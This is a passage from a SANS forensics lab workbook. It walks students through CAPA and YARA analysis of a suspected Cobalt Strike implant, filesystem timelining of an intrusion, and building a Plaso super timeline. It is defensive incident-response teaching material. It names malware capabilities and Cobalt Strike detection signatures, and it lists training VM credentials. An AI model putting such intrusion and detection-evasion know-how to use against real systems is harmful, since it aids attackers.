memory analysis section!
• Process Injection
• Reﬂective Code Loading

.

• Execute shellcode

2. In a command terminal, copy and rename the previously identiﬁed STUN.exe ﬁle into your G:\Labs\malware folder:
copy e:\C\Windows\System32\STUN.exe G:\Labs\malware\stun_exe

Execute CAPA against stun_exe . Do you see any big differences in capabilities between this and quarantined SRLUpdate.exe
ﬁle?
capa "G:\Labs\malware\stun_exe"

108

© 2023 SANS Institute

.

________________________________________________________________
Solution
The two executables have very similar CAPA output, making it likely they are both designed for the same purpose -shellcode injection and execution.
3. Optional Homework: Analyze the version of STUN.exe extracted during the memory analysis labs.
We previously extracted a copy of a running process named STUN.exe using the tool MemProcFS. The way an executable
looks in memory can be very different than the way it looks on disk. For this reason, it is common for malware reverse
engineers to execute malware and attempt sample extraction from memory to see a more accurate representation of the
code. Execute CAPA against our extracted copy and compare the results with the previous question. What new capabilities
does this sample show?
capa "G:\Labs\memory\STUN_exe_memory"

________________________________________________________________

.

________________________________________________________________

© 2023 SANS Institute

.

109

Solution
The CAPA output for this sample looks quite different from the on disk version. The following items identiﬁed are probably
most interesting:
• reference Base64 string

.

• allocate RWX memory

Optional Homework: Look for Indicators of Compromise with YARA
While YARA is perhaps best used via security tools like Velociraptor and MemProcFS, the standalone version, yara64.exe provides
a quick and easy way to search a collection of ﬁles for known indicators of compromise.
1. Change directory to the C:\Forensic_Program_Files\yara folder and execute a YARA scan against the suspicious ﬁles
extracted from our memory image in the previous lab. If you did not complete the memory analysis labs, you can extract
these ﬁles from the precooked ﬁle G:\Precooked\memory\memory_extracts.zip.
cd /d "C:\Forensic_Program_Files\yara"

yara64.exe .\signature_base_yara\gen_cobaltstrike.yar G:\Labs\memory

What ﬁle is identiﬁed with this Cobalt Strike signature? What is the speciﬁc signature name within the ﬁle which had a
match?
________________________________________________________________

110

© 2023 SANS Institute

.

________________________________________________________________
Solution
• Filename: G:\Labs\memory\minidump.dmp
• Signature Name: HKTL_CobaltStrike_SleepMask_Jul22

2. In the previous question you scanned a directory of ﬁles using a single targeted YARA rule. Now use a larger pre-compiled set
of rules (-C) to perform a more expansive search recursively (-r) on that same folder.
yara64.exe -r -C signature_base_yara.compiled G:\Labs\memory

What additional match was identiﬁed by the larger set of rules? How many different rules did it match?
________________________________________________________________
________________________________________________________________
Solution
• Filename: G:\Labs\memory\STUN_exe_memory
• It matched three rules, all related to Cobalt Strike
• Interestingly, if you repeat this same search in the G:\Labs\malware folder, no matches will be identiﬁed. This
underscores the concept that malware on disk can look very different than malware executing in memory. It is much

.

harder to hide in memory because code must ultimately be de-obfuscated and executed.

Note
You can ﬁnd the YARA rules used in this lab within your VM and also online at the Neo23x0 Signature Base Github
repository

Lab Takeaways
• The following executables were identiﬁed as anomalous:
• e:\c\Windows\System32\STUN.exe

© 2023 SANS Institute

.

111

• e:\c\Users\tdungan\Downloads\HiPERCalc.exe
• e:\c\Users\tdungan\Downloads\7z2201-x64.exe
• e:\c\Users\wacsvc\Downloads\ph.exe
• e:\c\Windows\Update\EdgeUpdater.exe
• Finding anomalies doesn't mean each executable identiﬁed is malware. However, using a collection of tools to analyze ﬁles in
different ways narrows the search for problematic executables.
• Embedded metadata within the portable executable headers indicated ph.exe could be the Process Hacker application
and EdgeUpdater.exe the Nirsoft Web Browser History Viewer.
• A scheduled task ﬁle and an executable were present in the Windows Defender quarantine on RD01
• C:\Windows\System32\Tasks\SRL User Maintenance
• C:\Windows\System32\SRLUpdate.exe
• The wacsvc account was used to create the scheduled task
• CAPA analysis indicated both STUN.exe and SRLUpdate.exe have the capability to perform process injection, reﬂective code
loading, and shellcode execution.
• Similar to results found during memory analysis, the in-memory version of STUN.exe matched multiple YARA signatures for a

.

Cobalt Strike beacon.

112

© 2023 SANS Institute

.

Lab 4.2: Filesystem Timeline Creation and Analysis
Objectives
1. Leverage two classic tools to create a ﬁle system timeline: MFTECmd and mactime .
2. Conduct a ﬁlesystem-based timeline analysis of a compromised system.
3. Identify detailed intruder activity on the system.
4. Gain experience answering investigative questions using a ﬁlesystem timeline.

Lab Preparation
This lab is completed in your 508 Windows VM
1. Launch the 508 Windows VM and log in.
• LOGIN = SANSDFIR
• PASSWORD = forensics
2. Please ensure your evidence is mounted correctly at rd01-triage(E:)

.

G:\SRL_Evidence\triage

If you do not see your evidence mounted, use Windows Explorer to browse to

and double-click on

the ﬁle rd01-triage.vhdx . The image will automatically mount in your 508 Windows VM using the next available drive letter
(likely E: ). If your image does not mount as drive letter E: , you likely have another device (often USB) attached to your virtual
machine. Consider ﬁxing this, rebooting and trying again. This lab assumes the triage image is mounted as E: .

© 2023 SANS Institute

.

113

Create a Filesystem Timeline
1. Open an administrator command terminal: right-click the Command Prompt shortcut from the desktop and choose "Run as
administrator":

2. In the command terminal, run MFTEcmd to extract the ﬁle system metadata from the RD01 $MFT into bodyﬁle format.
Assuming the triage is mounted as E: , run the following:
MFTECmd.exe -f "E:\C\$MFT" --body "G:\Labs\timeline" --bodyf rd01-mftecmd.body --blf --bdl C:

3. Switch to a Linux Bash shell and use mactime to create the ﬁlesystem timeline in CSV format. (Switching to a Linux prompt is
necessary for running mactime .) We are including a date ﬁlter to limit output to a reasonable time period: about two weeks
prior to the attacker activity already discovered. This command could always be run again in the future to extend the time
range should it be necessary.
bash

.

mactime -z UTC -y -d -b /mnt/g/Labs/timeline/rd01-mftecmd.body 2023-01-01..2023-01-27 > /mnt/g/Labs/
timeline/rd01-filesystem-timeline.csv

4. Examine the keyword ﬁlter list.
We have created a ﬁlter list to remove ﬁles from the timeline that are extremely noisy and distracting during analysis. As two
examples, browser cache data and Windows apps are voluminous and can drown out other interesting data. This is a
balancing act since you never quite know what will be important in a given timeline. During analysis you might ﬁnd
thousands of ﬁles from a speciﬁc application annoying and decide to add it to your noise ﬁle for future timeline ﬁltering.
Removing unwanted ﬁles from your timeline is ultimately a personal choice, and something you become better at with
experience. It can also be very case speciﬁc. Most of all, it is important to be aware that you are removing potential evidence
from your timeline and be conscious of what could be missing during your analysis. You will also have the original version of
the timeline should you ever need to double-check something to see if the removed items are relevant.
cat /mnt/g/Precooked/timeline/timeline_noise.txt

114

© 2023 SANS Institute

.

Warning
If you edit the timeline_noise.txt ﬁle in the future, do not leave any blank rows! A blank line will remove everything from
your timeline in the next step.

5. Filter the timeline using grep and the keyword ﬁlter ﬁle timeline_noise.txt :
cd /mnt/g/Labs/timeline

.

grep -a -v -i -f /mnt/g/Precooked/timeline/timeline_noise.txt rd01-filesystem-timeline.csv > rd01filesystem-timeline-final.csv

6. The mactime output formats ﬁle paths using the Unix nomenclature of forward slashes. We need to replace those forward
slashes with backslashes since we are investigating Windows systems. This step is not incredibly important for this exercise,
but will pay dividends when we add super-timeline data in the next exercise as many of those artifacts will also default to
backslashes. The sed (Stream Editor) tool makes this easy:
sed -i 's/\//\\/g' rd01-filesystem-timeline-final.csv

Warning
This is a tricky command line to type correctly, so be careful! You can also copy and paste it into the command terminal
for a higher success rate. If something goes wrong, you can always delete the rd01-ﬁlesystem-timeline-ﬁnal.csv ﬁle and rerun the previous "grep" command to create a new copy. If something goes irrevocably wrong with your timeline ﬁle, there
is a precooked version of this ﬁle in the G:\Precooked\timeline folder.

7. Launch Timeline Explorer from your Windows VM and open the ﬁle G:\Labs\timeline\rd01-filesystem-timeline-final.csv .

© 2023 SANS Institute

.

115

Note
When reviewing the timeline, you may encounter entries with the following tags:
• (deleted): The MFT entry for this ﬁle is marked as unallocated
• (deleted-realloc): An indication that the MFT entry has been reallocated to a new ﬁle and the currently reported
metadata does not correspond to a ﬁle with this name. In short, you can say that there was once a ﬁle with this name
different ﬁle.

.

in the ﬁle system, but all the information (including timestamps) reported cannot be trusted and likely belong to a

• c:/PathUnknown: An orphan ﬁle or folder. The parent folder of this deleted item was also deleted and is no longer
present in the MFT. Thus we have no knowledge of where this ﬁle was present in the folder hierarchy.

Lab Questions
Timeline Analysis
1. When was the directory C:\Windows\Update created? (Hint: Create a File Name column ﬁlter for windows\update )
________________________________________________________________

116

© 2023 SANS Institute

.

Solution
2023-01-17 14:57:37

2. What ﬁles are present in C:\Windows\Update ?
________________________________________________________________
________________________________________________________________
Solution
• c:/Windows/Update/EdgeUpdater.exe
• c:/Windows/Update/EdgeUpdater.cfg
• The "SmartScreen" tag seen in this folder is an Alternate Data Stream attached to the ﬁle. We will discuss these more
in depth in a future section.

.

• Notice that each ﬁle can have multiple entries in the timeline to represent its four primary "macb" timestamps.

3. Pivot around the creation of C:\Windows\Update to gain more context about this event. You can pivot around ﬁltered ﬁndings
by clicking on the item of interest within Timeline Explorer to ﬁx your view on that line. Then clear your ﬁlter to look at other
items present in the timeline nearby the item of interest. The power of timeline analysis comes from this additional context!
What user account could be responsible for the creation of C:\Windows\Update ?
________________________________________________________________

© 2023 SANS Institute

.

117

Solution
• Activity related to the wacsvc account can be found shortly before and shortly after the creation of the folder. This
indicates that account was currently authenticated on the system.
• The "Public" folders are a default location in Windows designed as a means for ﬁles and folders to be shared between
user accounts. It is not an account and thus could not be used for creating ﬁles and folders elsewhere in the ﬁle

.

system.

4. Now pivot around the last modiﬁcation of C:\Windows\Update . What interesting ﬁle is nearby in the timeline? What would
cause a folder to get its modiﬁcation time updated?
________________________________________________________________
________________________________________________________________

118

© 2023 SANS Institute

.

Solution
• STUN.exe is found immediately before C:\Windows\Update in the timeline. Imagine if we had not yet discovered this
executable as related to this intrusion. Its proximity to a known bad folder might have been the clue causing us to
focus on that ﬁle.
• Notice the timestamp for STUN.exe in this example is metadata change time ("c"). This indicates something about the
ﬁle changed. That could be caused by a ﬁle rename, a change in the parent folder (a ﬁle move), or something else in
the metadata of the ﬁle. The UsnJrnl (covered in a future section) could give us more insight into what happened with
the ﬁle at this time.

.

5. Clear any existing ﬁlters and ﬁlter the File Name column for STUN.exe.

© 2023 SANS Institute

.

119

Tip
Timeline Explorer has a wide range of ﬁlter options and it is easy to miss when a ﬁlter is still set. Get in the habit of

.

clearing all of your ﬁlters when starting a new search. A great option for this is the Ctrl-E shortcut (Tools -> Clear Filters).

• What timestamps are missing for STUN.exe? What could explain this?
________________________________________________________________
________________________________________________________________

120

© 2023 SANS Institute

.

Solution
• In our timeline, STUN.exe appears to only have a ("c") and ("a") timestamp. Modiﬁed ("m") and Creation ("b") are
missing.
• All ﬁles in NTFS have at least four timestamps, so something is peculiar here. If you remembered the time and
date ﬁltering we accomplished when creating the timeline, congratulations! What has happened is the other
timestamps are outside of the range of the ﬁlter we provided. In this case, they must be prior to 2023-01-01. The
problem with this ﬁnding is that if STUN.exe was created before 2023-01-01 it extends the time of the intrusion to
earlier than anything we have yet discovered. We will document this anomaly and investigate it further in
upcoming exercises.

• Why isn't there a Prefetch ﬁle for STUN.exe?
________________________________________________________________
Solution
In previous exercises we identiﬁed STUN.exe scheduled to run as a Windows Task and actively running as a process in
memory. The latter evidence in particular demonstrates that STUN.exe has executed on this system. Hence, we would
expect to see a corresponding Prefetch application execution artifact. We do not know why, but it doesn't exist. The

.

absence of a Prefetch ﬁle in these conditions should reinforce the idea that STUN.exe is very suspicious.
• Since this is a strange ﬁle, document the Meta address (Master File Table record number). We will use this metadata
address later in the class to investigate this ﬁle in more depth.
________________________________________________________________
Solution
STUN.exe MFT Record Address: 545-128-3

6. Clear any existing ﬁlters and create a new ﬁlter in the File Name column for EdgeUpdater.exe.
• When did EdgeUpdater.exe ﬁrst execute?

© 2023 SANS Institute

.

121

Hint
Don't forget about the ~-10 second rule!
________________________________________________________________
Solution
The creation time (ﬁrst execution time) for the corresponding prefetch ﬁle (-10 seconds) is 2023-01-17 18:21:05

7. Pivot on the creation time for EDGEUPDATER.EXE-39C2713A.pf. Remember that you can pivot around ﬁltered ﬁndings by
clicking on the item of interest within Timeline Explorer to ﬁx your view on that line. Then clear your ﬁlter to look at other items
present in the timeline nearby the item of interest.
• What deleted ﬁle is in close proximity to the ﬁrst execution of EdgeUpdater.exe? Can we make a guess at the original ﬁle
name?
________________________________________________________________

Solution

.

________________________________________________________________

• c:\$Recycle.Bin\S-1-5-21-2838623409-1327563992-2591358621-1220\$R2T2A0E.csv
• A LNK ﬁle was created at the same second as the deleted item named rd04_history.csv

• Can we identify the user account likely responsible for executing EdgeUpdater.exe?
________________________________________________________________

122

© 2023 SANS Institute

.

Solution
The LNK ﬁle that appears to be associated with the execution of EdgeUpdater.exe was created for the wacsvc user.

• Go to your mounted triage image and open the recycled ﬁle:

E:\C\

$Recycle.Bin\S-1-5-21-2838623409-1327563992-2591358621-1220\$R2T2A0E.csv

What type of data does EdgeUpdater.exe appear to be extracting?
________________________________________________________________
Solution
The column headers and data available indicate web browser history. This ﬁts with information we have previously
learned about EdgeUpdater.exe.

Is there any evidence of lateral movement using this tool?

.

________________________________________________________________
Solution
The "History File" column seems to indicate a history ﬁle was parsed from a remote system utilizing a C$
administrative share: \rd04.shieldbase.com\c$\Users\nromanoff\AppData\Local\Microsoft\Edge\User
Data\Default\History

• Move back to your timeline, rd01-filesystem-timeline-final.csv . Clear any existing ﬁlters (CTRL-E) and do a quick
ﬁlter in the File Name column for .csv.
From how many total systems does it appear data was collected?
________________________________________________________________

© 2023 SANS Institute

.

123

Solution
.csv ﬁles named for four separate SRL systems were opened by the wacsvc account:
• rd04
• rd03
• rd02
• rd09

8. Forensic analysis of LNK ﬁles can tell us the ﬁrst time ("b") and last time ("m") a ﬁle or folder was opened by a user account.
With previous demonstration of interesting LNK ﬁles present in our timeline, ﬁlter the timeline to identify all .lnk ﬁles saved
for the wacsvc account.
Clear any existing ﬁlters and create a File Name ﬁlter for .lnk. To narrow the focus to a speciﬁc account, add wacsvc in the
global ﬁlter bar in the top-right of Timeline Explorer. To remove the built-in LNK ﬁles every proﬁle receives, add recent into the
global ﬁlter bar. Click Find to set the new ﬁlter.

.

Example Filter

Between what times did the wacsvc account open ﬁles and folders? Would this information be useful to Stark Research Labs?
________________________________________________________________
________________________________________________________________

124

© 2023 SANS Institute

.

Solution
• Files and folders were opened by wacsvc from 2023-01-17 16:37:52 to 2023-01-18 15:16:56
• If we assume wacsvc is a compromised account, clearly this information would be useful for damage assessment
purposes. LNK ﬁles are important for analysis because they show what a user interacted with or appeared interested
in. These ﬁles are part of a forensic artifact category called "Evidence of File Opening." LNK ﬁles are generated in a
user's Recent folder when ﬁles are opened in an interactive desktop session. In intrusion cases, the attackers might be
looking for ﬁles of interest to exﬁltrate or be interacting with their tool folders. This data is invaluable as it lets us "peer
into the mind" of the adversary, giving us hints of their true goals in the network.
• We can gather even more information from these LNK ﬁles, such as full path information, but that will require a LNK
parser found in the upcoming supertimeline exercise.

9. When did the wacsvc account ﬁrst interactively log onto system RD01?
Hint
Interactive logons typically result in a GUI desktop (think RDP) and thus need to create a user proﬁle.
________________________________________________________________

.

Solution
• The creation of folder C:\Users\wacsvc occurred on 2023-01-17 14:43:03. This is often a good indication of ﬁrst
interactive logon time for an account.
• In certain rare situations, a proﬁle creation could be the result of the user's ﬁrst network logon, such as a PsExec
session without specifying " -e ", or a PowerShell Remoting session without the " -NoMachineProfile " SessionOption
set. For this reason, the Windows Security log should be the deﬁnitive evidence for logon information. In this example,
the RD01 event logs agree with our educated guess, showing a Type 10 (RDP) logon for wacsvc on 2023-01-17
14:43:03.

© 2023 SANS Institute

.

125

Bonus: Optional Homework
1. More than just pivoting around times, ﬁles, and folders, timelines can also help answer broader questions. As an example, a
useful question to answer during intrusion investigations is whether there were any new executables introduced on the
system. Let's create a ﬁlter to answer this question. After each ﬁlter is added, look at the current state of the data and imagine
what additional ﬁlters are necessary to get actionable information:
• Clear all existing ﬁlters with CTRL-E
• Filter the File Name column for .exe
• Filter the macb column for creation times: b
• Remove Prefetch entries by typing -.pf in the global ﬁlter and clicking Find (top-right of Timeline Explorer)
• There is still a lot of noise in the output, so remove Oﬃce items by adding -oﬃce in the global ﬁlter. Click Find
• Review the items in the "c:\Program Files (x86)" folder. Do you notice that they are all related to the same application?
Add yet another entry into the global ﬁlter: -"Program Files" and click Find

• This should get you to a small enough set of data to quickly review. However, feel free to subtract additional items if you
like.
Review your ﬁltered results. What ﬁles are present which we have previously documented as interesting in this investigation?
________________________________________________________________

.

________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________

126

© 2023 SANS Institute

.

Solution
• c:\Users\tdungan\Downloads\7z2201-x64.exe
• c:\Windows\Update\EdgeUpdater.exe
• c:\Users\wacsvc\Downloads\px.exe
• c:\Users\wacsvc\Downloads\ph.exe
• c:\Windows\subject_srv.exe (previously identiﬁed as the security tool F-Response)
• That was a quick way to identify several interesting ﬁles we previously worked very hard to ﬁnd! Each one of these

.

could be a pivot point to learn about other activity around the time of their creation.

2. One more pivot for some extra practice: pivot on the last execution time of notepad.exe.
Hint
Recall that the modiﬁcation time of a Prefetch ﬁle is the last execution time.
• What was the ﬁle likely to be last opened by notepad.exe?
________________________________________________________________
________________________________________________________________

© 2023 SANS Institute

.

127

Solution
• dev01.shieldbase.com.txt
• Did you remember to subtract 10 seconds from the execution time? This is a great example of when that might
matter. The LNK ﬁle for dev01.shieldbase.com.txt indicates it was opened exactly 10 seconds before notepad.exe
was executed!

• What user account likely opened the ﬁle (and notepad.exe)?
________________________________________________________________
Solution
• wacsvc
• The LNK ﬁle found was created in the wacsvc proﬁle

.

• What interesting application executed after notepad.exe? How many times has it executed on RD01?
________________________________________________________________

128

© 2023 SANS Institute

.

Solution
• MSTSC.exe - Microsoft Terminal Services Client (RDP)
• With the modiﬁcation ("m") and creation ("b") times being the same, this means it has only executed once on
RD01 (both ﬁrst and last time executed match)
• The time proximity to the notepad.exe execution makes it likely they are related or part of the same user session.

• What interesting ﬁle in the timeline is related to the application just identiﬁed?
________________________________________________________________
Solution
• c:\Users\wacsvc\Documents\Default.rdp
• Similar to an earlier question, notice this ﬁle was created exactly ten seconds before the Prefetch ﬁle for

.

MSTSC.exe was created/modiﬁed.

• Notice how the c:\Users\wacsvc\Documents folder has an updated modiﬁed time to reﬂect the new ﬁle being
added to the folder.

• Go to your mounted triage image and open the ﬁle found in the previous question using Notepad++. Can you ﬁnd any
evidence of lateral movement? When did the lateral movement occur?

© 2023 SANS Institute

.

129

________________________________________________________________
Solution
• The "full address" value within c:\Users\wacsvc\Documents\Default.rdp recorded dev01.shieldbase.com as the
ﬁrst system connected to via the Microsoft Terminal Services Client.
• Using the creation time of Default.rdp (or execution time of MSTSC.exe), we also know when the lateral movement
occurred: 2023-01-18 14:54:48

Lab Takeaways
• The attacker tool folder, C:\Windows\Update, was created on RD01 at 2023-01-17 14:57:37
• The last modiﬁcation to the folder occurred on 2023-01-23 18:54:54
• Tool execution and opening of sensitive Stark Research Lab ﬁles were tied to the wacsvc account

.

• wacsvc ﬁrst interactively logged on to the system on 2023-01-17 14:43:03
• This is approximately ﬁfteen minutes before the creation of C:\Windows\Update
• C:\Windows\System32\STUN.exe continues to exhibit strange characteristics
• Its modiﬁcation and creation times are out of the range of other ﬁndings, including the ﬁrst logon by the wacsvc account
(before 2023-01-01)
• A Prefetch ﬁle does not exist for this executable
• EdgeUpdater.exe appears to have been used to collect web browser history data
• Related ﬁles indicate browser history collection on RD02, RD03, RD04, and RD09

130

© 2023 SANS Institute

.

Lab 4.3A: Super Timeline Creation - Windows
Objectives
1. Learn to use Plaso tools installed in Windows Subsystem for Linux.
2. Create a super timeline of RD01 using log2timeline.
3. Filter the super timeline using psort to reduce the number of duplicate entries in the timeline and focus your analysis during
the time frame of the attack.

About Plaso Installation Options
In this lab, we walk through the process of creating a super timeline with log2timeline and psort from the Plaso project. The
recommended installation method for Windows is to run Plaso in a Docker container, as mentioned at the top of the User's Guide
(https://plaso.readthedocs.io/en/latest/sources/user/Users-Guide.html). However, using Docker within a Windows VM requires
speciﬁc virtualization settings on the host machine. We don't require those settings for the class due to potential incompatibilities.
Fortunately, a workaround is to use the Windows Subsystem for Linux (WSL). The Linux version installed in the FOR508 Windows
VM is Ubuntu. So, we've installed Plaso in WSL according to the instructions in the User's Guide for installing in Ubuntu.
It is worth noting that there are advantages to using the Docker version. In particular, it makes it very easy to upgrade and
downgrade Plaso versions. In the Linux version of this lab (4.3B), we use the Docker container to create the super timeline.
Fortunately, Docker runs in the Linux VM without any special settings required. We think it is valuable to see how it works in both
versions of the VMs so you have the steps necessary to run Plaso anywhere you might need to.

.

Note
In the Windows VM, we've installed the latest development version of the Plaso tools available in mid-2023. The version is
20230630 . The precooked version of the super timeline used in Lab 4.4 - Super Timeline Analysis is from a slightly older Plaso

version, speciﬁcally 20230520 . Therefore, the super timeline created in this optional lab will differ slightly from the precooked
one used in Lab 4.4. In Lab 4.3B: Super Timeline Creation - Linux, we demonstrate how to create a timeline matching the
precooked version by using a Docker container from Plaso's 20230520 development release.

Lab Preparation -- Mount VHDX Image Using 508 Windows VM
This lab is completed in your 508 Windows VM
1. Launch the 508 Windows VM and log in.
• LOGIN = SANSDFIR
• PASSWORD = forensics
2. Please ensure your evidence is mounted correctly at rd01-triage(E:)

© 2023 SANS Institute

.

131

If you do not see your evidence mounted, use Windows Explorer to browse to G:\SRL_Evidence\triage and double-click on
the ﬁle rd01-triage.vhdx . The image will automatically mount in your 508 Windows VM using the next available drive letter
(likely E: ). If your image does not mount as drive letter E: , you likely have another device attached to your virtual machine.
Consider ﬁxing this, rebooting, and trying again--or adjust the drive letters below as necessary. This lab assumes the triage
image is mounted as E: .
3. We will run the Plaso tools from Windows Subsystem for Linux (WSL). Open an Ubuntu WSL shell by clicking on the orange

.

and white icon on the Taskbar:

4. Let's verify the VHDX drive letter is available. Run ls -l /mnt and you should see not only the c and g drives, but also the
drive letter for the VHDX mounted image. In this case, it's mounted as e :
ls -l /mnt

132

© 2023 SANS Institute

.

Troubleshooting - Drive letter for VHDX image missing
Windows Subsystem for Linux can be ﬁnicky at times about presenting access to mounted drives. If you do not see the /
mnt/e (or corresponding drive letter for the mounted VHDX triage image), then ﬁrst verify you see it in Windows File

.

Explorer. It should look like the following:

Assuming you see it in File Explorer, try closing and restarting the Ubuntu Bash shell. If you still don't see it via
, then the best bet is likely a reboot of the Windows VM. After reboot, follow the steps above to mount

ls -l /mnt

rd01-triage.vhdx

again. Finally, check again with ls -l /mnt and it should be available following the clean VM restart.

Lab -- Create the Super Timeline and Prep for Analysis
Abstract
The remaining steps take considerable time to ﬁnish and are not intended to be accomplished in class. Depending on the
speed of your system, the remaining steps could take an hour or more to complete.

1. We begin by parsing the contents of the mounted VHDX image using log2timeline. In the commands below, we specify the
known time zone of the RD01 host (US Eastern time) and the preferred parsers. We are using the "win7" preset minus the
"ﬁlestat" parser. We then run log2timeline.py a second time to add in the ﬁlesystem timeline body ﬁle we created with
MFTECmd and mactime in Lab 4.2.

© 2023 SANS Institute

.

133

log2timeline.py --timezone 'EST5EDT' --parsers 'win7,!filestat' --storage-file /mnt/g/Labs/timeline/rd01triage.plaso /mnt/e/C/

Command line notes
In the commands above, we are choosing the following parsers:
In the ﬁrst command:
• --parsers 'win7,!filestat' -- we choose the win7 parser preset and exclude the filestat plugin. The filestat
plugin is not a great option when running log2timeline against selected ﬁles in a triage image, as we are doing here.
This plugin is not a MFT parser. It simply extracts the timestamps of the ﬁles which log2timeline parses (i.e., the
relatively small number of ﬁles in the triage image). It does not parse the MFT to extract timestamps of all ﬁles that
were on the subject system. We want to include all the timestamps, so instead of using filestat , we can use a
workaround to separately add the ﬁle system timeline data we previously generated with MFTECmd .

2. Before we add in the body ﬁle for the ﬁle system timestamps, we are going to ﬁlter out noisy events as we did in Lab 4.2.

Attention
As mentioned in Lab 4.2, be careful to review any noise ﬁltering terms before implementing them in a real case. The set of
terms used in our timeline_noise.txt ﬁle is pertinent to the Stark Research Labs environment. The terms you ﬁlter (if
any) may need to be different.

.

grep -a -v -i -f /mnt/g/Precooked/timeline/timeline_noise.txt /mnt/g/Precooked/timeline/rd01-mftecmd.body
> /mnt/g/Labs/timeline/rd01-mftecmd-final.body

We also would like to change the forward slashes to backslashes to match the Windows path style. We can do that with the
following sed command:
sed -i 's/\//\\/g' /mnt/g/Labs/timeline/rd01-mftecmd-final.body

We are now ready to import the ﬁnal ﬁle system timeline data into log2timeline :
log2timeline.py --parsers 'mactime' --storage-file /mnt/g/Labs/timeline/rd01-triage.plaso /mnt/g/Labs/
timeline/rd01-mftecmd-final.body

Command line notes
In the commands above, we are choosing the following parsers:
• --parsers 'mactime' -- this parser ingests the body ﬁle information collected from the earlier run of

MFTECmd

followed by mactime . Note that an input time zone is not necessary for the mactime parser since it is processing an
NTFS ﬁle system body ﬁle that already has its timestamps in UTC.

134

© 2023 SANS Institute

.

3. After the log2timeline commands are complete, we have a Plaso database ﬁle with artifacts ready to export. To get the data
exported into a CSV or other format for timeline review, we use psort.py . Run the following command to export the data to
CSV:
psort.py --output-time-zone 'UTC' -o l2tcsv -w /mnt/g/Labs/timeline/rd01-triage.csv /mnt/g/Labs/timeline/
rd01-triage.plaso "(((parser == 'winevtx') and (timestamp_desc == 'Creation Time')) or (parser !=
'winevtx')) and ( date >= DATETIME('2023-01-01T00:00:00.000') AND date <=
DATETIME('2023-01-27T00:00:00.000'))"

Command line notes
There's a lot to this command. Let's break it down:
• --output-time-zone 'UTC' will create the super timeline in UTC time.
• -o l2tcsv -w /mnt/g/Labs/timeline/rd01-triage.csv /mnt/g/Labs/timeline/rd01-triage.plaso generates a CSV
output ﬁle named rd01-triage.csv based on the parsed data in rd01-triage.plaso
• "(((parser == 'winevtx') and (timestamp_desc == 'Creation Time')) or (parser != 'winevtx')) and ( date >
datetime('2023-01-01T00:00:00') AND date < datetime('2023-01-27T00:00:00'))" ﬁlters the output for only

"winevtx" Creation Time events, thereby ignoring the "winevtx" Content Modiﬁcation Time events. Furthermore, it

.ir

extracts all other parser types, and it ﬁlters everything to the time range of interest for our case.

01

Note

Technically speaking, the Windows .evtx event log ﬁles contain two timestamps per event: Creation Time and

de

Content Modiﬁcation Time. The Creation Time is the time when each event is generated, and it's stored in the XML
data of the event log entries. In almost every case, this is the only timestamp you will care about when analyzing

hi

Windows event logs. Therefore, we perform noise reduction here by ﬁltering out the extraneous "winevtx" Content
Modiﬁcation Time entries. For more information on the two event log timestamps, see the article "Export corrupts
Windows Event Log ﬁles" at https://blog.fox-it.com/2019/06/04/export-corrupts-windows-event-log-ﬁles/.

4. You now have a super timeline that is ready to review. For our purposes, however, we'll take one additional step to remove
some of the noisier Windows event logs and events. The ﬁltering process is implemented via a PowerShell script that includes
a list of Event ID numbers we want to retain. Additionally, there is a ﬁlter ﬁle telling the script which source event log ﬁles to
keep. Said another way, for an event to be retained, it has to be from one of the event log ﬁles speciﬁed in
EventLogs2Process.txt AND the event has to have an event ID in the list of event ID numbers in the script

Filter-

Timeline_Events.ps1 .

© 2023 SANS Institute

.

135

Attention
Effective data reduction is an important aspect of forensics and incident response. With IR in particular, we need to be
quick, but also accurate. So, ﬁltering our data for noise reduction is an important technique, but we must do it with care
and always be cognizant of what we may have missed in the effort to speed up our analysis. That said, we do recommend
incorporating data ﬁltering techniques into your investigations, but pay close attention to what you are ﬁltering.
For example, our list of terms ﬁltered from the ﬁle system body ﬁle earlier in the lab may not be relevant to your
investigation. The same is true for the event logs we will ﬁlter next. We've built the ﬁlter list based on events we want to see
(i.e., the events covered in class), but it's certainly possible that your organization has enabled other Windows events that
should be retained as well. Also, this list is primarily pertinent for end-user host systems, and perhaps some typical server
roles. More specialized roles, such as domain controllers, Exchange servers, SQL servers, etc., likely require a different ﬁlter
list...if any ﬁlter list at all. Think of this ﬁlter as similar to pre-ﬁltering data before ingesting into a SIEM.

Let's take a quick look at both the script and the ﬁlter ﬁle. In File Explorer, browse to the C:
\Forensic_Program_Files\PowerShell folder. Now right-click on Filter-Timeline_Events.ps1 and choose Open with

hi

de

01

.ir

Notepad++**.

Be sure to read the description information and notice the list of Event IDs currently speciﬁed to retain.

136

© 2023 SANS Institute

.

.
Next, open the EventLogs2Process.txt with Notepad++. Here we specify which Windows event log ﬁles to consider for
inclusion. If an event log is not listed here, then none of its events will be retained, regardless of event ID number.

© 2023 SANS Institute

.

137

5. Now let's run the script against the output CSV from psort. Open a PowerShell window and run the following command:
Filter-Timeline_Events.ps1 -InputPath G:\Labs\timeline\rd01-triage.csv -EventLogPath C:
\Forensic_Program_Files\PowerShell\EventLogs2Process.txt -OutputPath G:\Labs\timeline\rd01-supertimeline.csv

The script has a lot of events to churn through, so it will likely take close to 5 minutes to complete. When it ﬁnishes, it will
report number of events in the original timeline CSV and the number of events in the ﬁltered CSV.

You should see that the ﬁnal super timeline has removed more than 400,000 events! Speciﬁcally, it removed a large number
of Windows event logs that are unlikely to be pertinent to our case...but not impossible! When in doubt, you still have the
original rd01-triage.csv output from psort to review too.

.

Note
The number of events in this rd01-supertimeline.csv will be slightly more than the number in the precooked version we
analyze in Lab 4.4. That's because the Windows VM has a newer version of Plaso and was able to parse out about 1500
more events (primarily the sourcetype of "Chrome Cache").

Lab Takeaways
• Log2timeline is not a quick process to run.
• Compare the length of time to create a super timeline versus a ﬁlesystem timeline.
• However, the additional context we obtain through the super timeline analysis is very powerful, as you will see in Lab 4.4:
Super Timeline Analysis.

138

© 2023 SANS Institute

.

Lab 4.3B: Super Timeline Creation - Linux
Objectives
1. Learn to use Plaso tools in Docker containers.
2. Create a super timeline of RD01 using log2timeline.
3. Filter the super timeline using psort to reduce the number of duplicate entries in the timeline and focus your analysis during
the time frame of the attack.

Lab Preparation -- Mount VHDX Image Using Linux SIFT VM
This lab is completed in your 508 SIFT Linux VM
1. Launch the 508 SIFT Linux VM and log in.
• LOGIN = sansforensics
• PASSWORD = forensics
2. Elevate your privileges to root. sudo password is forensics
sudo su

3. Change directories to the /cases/triage/ .
cd /cases/triage/

.

